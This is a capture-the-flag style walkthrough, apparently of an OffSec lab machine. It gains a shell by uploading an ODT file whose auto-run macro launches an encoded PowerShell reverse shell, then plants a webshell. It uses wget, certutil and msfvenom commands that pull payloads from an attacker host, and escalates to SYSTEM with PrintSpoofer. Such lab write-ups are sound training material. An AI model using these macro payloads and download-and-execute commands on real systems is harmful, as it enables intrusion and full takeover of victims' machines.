Host:
```
192.168.212.169
```
# 80
![](attachment/59cc6d64f4678b32e6aec16366fb2020.png)
From website:
admin@craft.offsec
![](attachment/77338c3a37122bdb329a9448143bf039.png)
There is a file upload

![](attachment/1220a1807a8d5fbb5b7740a63c27189e.png)
We need an ODT file for exploiting

Now create an odt file 
Then  add the macro:
Tools-> macros->Organise macros-->Basic![](attachment/8b78addc9436e1d3924450e5ea44720e.png)
Create a macro
![](attachment/348e8a0eb661efb4fe4f9b948c07f64f.png)
```
Sub Main
    Shell("cmd /c powershell -e JABjAGwAaQBlAG4Ad...ABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA")
End Sub
```
\
Then we can configure it to open on document open:

Tools-->Customise:
![](attachment/0388372b75812b418eb3b74a2b6ce7e8.png)

Now we can upload the file and get a shell:![](attachment/d449b7e3b915d5afb868e68ce214b1e0.png)

Shell:
![](attachment/73e5ce1ce1321085e3d018b27e13d88c.png)\

Now we find the files for the web server:
![](attachment/9d36c2187455ce851e81f789b7b64ef5.png)
We can put a webshell:
```
wget http://192.168.45.236/shell.php -o shell.php
```
and make a reverse shell:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.236 LPORT=3001 -f exe -o shell.exe
```
```
wget http://192.168.45.236/shell.exe -o shell.exe
```
![](attachment/f9b617c4ef49ae6916c440848f3410bb.png)
Now we can run it:
![](attachment/2f4c6c00550a1ea63cfda8571898745b.png)
Now we get a shell:
![](attachment/1bc733991916fcc4a58d61fed7c2995a.png)\

Now using `whoami /priv`:
![](attachment/9c8a085ea19c4ad0b16a534dc8e4b5d3.png)

We can use PrintSpoofer:
```
certutil -urlcache -f http://192.168.45.236/PrintSpoofer64.exe PrintSpoofer64.exe
```
```
PrintSpoofer.exe -i -c powershell.exe
```
We get a shell as nt authority\system:![](attachment/579fa7ad9786155f24ec53855257de75.png)

